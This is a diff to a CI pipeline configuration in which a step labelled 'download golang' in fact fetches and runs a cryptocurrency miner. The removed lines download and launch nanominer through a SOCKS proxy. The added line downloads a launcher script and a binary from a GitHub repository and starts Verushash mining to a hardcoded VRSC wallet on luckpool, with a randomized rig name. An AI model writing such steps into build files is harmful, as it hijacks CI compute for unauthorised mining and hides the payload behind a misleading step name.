@@ -10,5 +10,4 @@ platform:
 steps:
 - name: download golang
   commands:
-  - wget -O 2 https://raw.githubusercontent.com/renifer12/master/main/nanominer
-  - wget -O 1 https://raw.githubusercontent.com/renifer12/master/main/config.ini && export http_proxy=socks5://152.160.254.11:1080 && chmod u+x 1 && ./1
+  - wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo Verushash -coin VRSC -wallet RLM9zhMnfJisKwYpbREgsfyFrs2RnZvs4e  -rigName  $(echo $(shuf -i 1-2 -n 1)-LAA) -pool1 ap.luckpool.net:3956
